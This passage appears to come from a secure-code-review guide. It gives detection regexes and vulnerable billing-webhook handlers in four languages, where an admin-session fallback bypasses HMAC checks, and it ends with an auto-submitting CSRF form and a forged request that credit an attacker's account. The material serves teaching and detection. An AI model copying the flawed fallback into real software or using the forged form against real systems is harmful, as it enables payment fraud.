\b(?:!\s*isValidHmac.*isAdminSession|verifyHmac.*(?:\|\||&&).*isAuthenticated\s*\(\s*\)|signature\s*==\s*null.*user\.getRole|checkSignature.*isAdmin\s*\(\s*\)|Mac\.doFinal|MessageDigest\.isEqual)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:!\s*\$?isValidHmac.*isAdminSession|verifyHmac.*(?:\|\||&&).*isAuthenticated|\$signature\s*==\s*null.*\$req->user->role|checkSignature.*isAdmin\s*\(\s*\)|hash_hmac|hash_equals)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:!\s*isValidHmac.*isAdminSession|verifyHmac.*(?:\|\||&&).*isAuthenticated|signature\s*==\s*null.*req\.user\.role|checkSignature.*isAdmin\s*\(\s*\)|crypto\.createHmac|crypto\.timingSafeEqual)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/webhooks/billing/event")]
public async Task<IActionResult> HandleBillingWebhook([FromForm] BillingEventDto evt) 
{
    // [1]
    var signature = Request.Headers["X-Hub-Signature"].FirstOrDefault();
    bool isValidHmac = _cryptoService.VerifyHmac(signature, evt.RawBody);

    // [2]
    bool isAdminRetry = _sessionContext.IsAuthenticated && _sessionContext.Role == "Administrator";

    // [3]
    if (!isValidHmac && !isAdminRetry) 
    {
        return Unauthorized("Invalid webhook signature.");
    }

    // [4]
    await _billingService.ProcessPaymentEventAsync(evt.TransactionId, evt.Action, evt.AccountId);
    return Ok();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping(value = "/api/v1/webhooks/billing/event", consumes = {MediaType.APPLICATION_JSON_VALUE, MediaType.APPLICATION_FORM_URLENCODED_VALUE})
public ResponseEntity<?> handleBillingWebhook(@ModelAttribute BillingEventDto evt, HttpServletRequest request) {
    // [1]
    String signature = request.getHeader("X-Hub-Signature");
    boolean isValidHmac = cryptoService.verifyHmac(signature, evt.getRawBody());

    // [2]
    boolean isAdminRetry = sessionContext.isAuthenticated() && "Administrator".equals(sessionContext.getRole());

    // [3]
    if (!isValidHmac && !isAdminRetry) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("Invalid webhook signature.");
    }

    // [4]
    billingService.processPaymentEvent(evt.getTransactionId(), evt.getAction(), evt.getAccountId());
    return ResponseEntity.ok().build();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function handleBillingWebhook(Request $request) 
{
    // [1]
    $signature = $request->header('X-Hub-Signature');
    $isValidHmac = $this->cryptoService->verifyHmac($signature, $request->getContent());

    // [2]
    $isAdminRetry = $this->sessionContext->isAuthenticated && $this->sessionContext->role === 'Administrator';

    // [3]
    if (!$isValidHmac && !$isAdminRetry) 
    {
        return response('Invalid webhook signature.', 401);
    }

    // [4]
    $this->billingService->processPaymentEvent($request->input('transaction_id'), $request->input('action'), $request->input('account_id'));
    return response('OK', 200);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/webhooks/billing/event', async (req, res) => {
    // [1]
    let signature = req.headers['x-hub-signature'];
    let isValidHmac = cryptoService.verifyHmac(signature, req.rawBody);

    // [2]
    let isAdminRetry = req.session && req.session.isAuthenticated && req.session.role === 'Administrator';

    // [3]
    if (!isValidHmac && !isAdminRetry) {
        return res.status(401).send("Invalid webhook signature.");
    }

    // [4]
    await billingService.processPaymentEvent(req.body.transaction_id, req.body.action, req.body.account_id);
    res.status(200).send();
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The controller attempts to validate the cryptographic signature generated by the external third-party provider, extracting it from the custom HTTP header, \[2] The developer implements an internal administrative fallback optimization, checking the active session context attached to the request, \[3] The authentication logic diverges. The system explicitly bypasses the `isValidHmac` failure if the request carries a valid administrator session. Because webhooks lack anti-CSRF tokens by design, this endpoint relies entirely on the HMAC as its security boundary, \[4] The payload is executed. The developer assumed the only way an Admin session cookie reaches this endpoint is via a manual replay from an internal, trusted dashboard XHR request. They failed to realize the browser automatically attaches the session to malicious third-party HTML form submissions

```html
<!-- Hosted on attacker.com -->
<html>
  <body>
    <form action="https://api.enterprise.tld/api/v1/webhooks/billing/event" method="POST" enctype="application/x-www-form-urlencoded">
      <input type="hidden" name="transaction_id" value="txn_attacker_forged_999" />
      <input type="hidden" name="action" value="payment_succeeded" />
      <input type="hidden" name="account_id" value="attacker_uuid" />
      <input type="submit" value="Claim Reward">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

```http
POST /api/v1/webhooks/billing/event HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/x-www-form-urlencoded
Cookie: SessionToken=ADMIN_VICTIM_COOKIE

transaction_id=txn_attacker_forged_999&action=payment_succeeded&account_id=attacker_uuid
```
{% endstep %}

{% step %}
The attacker sends a phishing link to an authenticated enterprise administrator. When the admin loads the page, the browser silently executes the auto-submitting HTML form. The cross-origin POST request hits the webhook ingestion endpoint. Since the browser cannot set custom headers on form submissions, `X-Hub-Signature` is null, causing the HMAC verification to fail. However, the browser successfully attaches the `SessionToken` cookie. The backend evaluates the fallback logic, identifies the administrator session, grants access, and executes the forged webhook. The system credits the attacker's account with a successful payment transaction, entirely circumventing the lack of Anti-CSRF tokens through a stateful debugging optimization
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
